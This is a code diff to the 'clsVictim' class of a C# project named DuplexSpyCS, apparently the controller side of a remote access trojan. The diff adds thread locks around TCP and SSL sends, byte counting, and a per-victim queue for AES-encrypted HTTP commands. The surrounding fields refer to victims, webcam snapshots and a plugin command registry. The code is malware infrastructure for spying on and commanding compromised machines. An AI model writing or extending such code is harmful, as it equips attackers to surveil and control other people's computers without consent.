@@ -7,6 +7,7 @@ using System.Net;
 using System.Net.Sockets;
 using DuplexSpyCS;
 using System.Net.Security;
+using static DuplexSpyCS.clsHttpListener;
 
 public class clsVictim
 {
@@ -37,6 +38,10 @@ public class clsVictim
     public int _sent_bytes = 0;
     public int SentBytes { get { return _sent_bytes; } }
 
+    //Lock
+    private readonly object _tcpWriteLock = new object();
+    private readonly object _sslWriteLock = new object();
+
     //FOLDER
     public string dir_victim;
 
@@ -48,6 +53,9 @@ public class clsVictim
 
     //WEBCAM
     public Image img_LastWebcam;
+
+    //HTTP
+    private Queue<clsHttpResp> m_qResponse = new Queue<clsHttpResp>();
 
     public Dictionary<string, List<clsPlugin.stCommandSpec>> m_dicCommandRegistry = new();
 
@@ -91,17 +99,21 @@ public class clsVictim
             try
             {
                 buffer = new clsDSP((byte)Command, (byte)Param, buffer).GetBytes();
-                socket.BeginSend(buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback((ar) =>
+                
+                lock(_tcpWriteLock)
                 {
-                    try
+                    socket.BeginSend(buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback((ar) =>
                     {
-                        socket.EndSend(ar);
-                    }
-                    catch (Exception ex)
-                    {
-                        clsStore.sql_conn.WriteErrorLogs(this, ex.Message);
-                    }
-                }), buffer);
+                        try
+                        {
+                            socket.EndSend(ar);
+                        }
+                        catch (Exception ex)
+                        {
+                            clsStore.sql_conn.WriteErrorLogs(this, ex.Message);
+                        }
+                    }), buffer);
+                }
 
                 clsStore.sent_bytes += buffer.Length;
             }
@@ -118,17 +130,20 @@ public class clsVictim
 
         try
         {
-            socket.BeginSend(abBuffer, 0, abBuffer.Length, SocketFlags.None, new AsyncCallback((ar) =>
+            lock(_tcpWriteLock)
             {
-                try
+                socket.BeginSend(abBuffer, 0, abBuffer.Length, SocketFlags.None, new AsyncCallback((ar) =>
                 {
-                    socket.EndSend(ar);
-                }
-                catch (Exception ex)
-                {
-                    clsStore.sql_conn.WriteErrorLogs(this, ex.Message);
-                }
-            }), abBuffer);
+                    try
+                    {
+                        clsStore.sent_bytes += socket.EndSend(ar);
+                    }
+                    catch (Exception ex)
+                    {
+                        clsStore.sql_conn.WriteErrorLogs(this, ex.Message);
+                    }
+                }), abBuffer);
+            }
         }
         catch (Exception ex)
         {
@@ -162,7 +177,7 @@ public class clsVictim
             case enListenerProtocol.HTTP:
                 var listener = (clsHttpListener)m_listener;
                 var pkt = new clsHttpListener.clsHttpResp(2, 0, Encoding.UTF8.GetBytes(clsCrypto.AESEncrypt(command, _AES.key, _AES.iv)));
-                listener.fnEnqueue(pkt);
+                fnEnqueue(pkt);
                 break;
         }
     }
@@ -190,17 +205,21 @@ public class clsVictim
     /// <param name="abBuffer"></param>
     public void fnSslSendRaw(byte[] abBuffer)
     {
-        m_sslClnt.BeginWrite(abBuffer, 0, abBuffer.Length, new AsyncCallback((ar) =>
+        lock(_sslWriteLock)
         {
-            try
+            m_sslClnt.BeginWrite(abBuffer, 0, abBuffer.Length, new AsyncCallback((ar) =>
             {
-                m_sslClnt.EndWrite(ar);
-            }
-            catch (Exception ex)
-            {
+                try
+                {
+                    m_sslClnt.EndWrite(ar);
+                    clsStore.sent_bytes += abBuffer.Length;
+                }
+                catch (Exception ex)
+                {
 
-            }
-        }), abBuffer);
+                }
+            }), abBuffer);
+        }
     }
 
     public void fnHttpSend(string szMsg) => fnHttpSend(2, 0, szMsg);
@@ -209,14 +228,31 @@ public class clsVictim
         var listener = (clsHttpListener)m_listener;
         var resp = new clsHttpListener.clsHttpResp(nCmd, nParam, szMsg);
         
-        listener.fnEnqueue(resp);
+        fnEnqueue(resp);
     }
     public void fnHttpSend(int nCmd, int nParam, byte[] abMsg)
     {
         var listener = (clsHttpListener)m_listener;
         var resp = new clsHttpListener.clsHttpResp(nCmd, nParam, abMsg);
 
-        listener.fnEnqueue(resp);
+        fnEnqueue(resp);
+    }
+
+    public void fnEnqueue(clsHttpResp resp)
+    {
+        m_qResponse.Enqueue(resp);
+    }
+
+    public clsHttpResp fnGetResponse()
+    {
+        if (m_qResponse.Count == 0)
+        {
+            return new clsHttpResp(3, 0, "HTTP 500://Server internal error.");
+        }
+        else
+        {
+            return m_qResponse.Dequeue();
+        }
     }
 
     public void Reconnect()
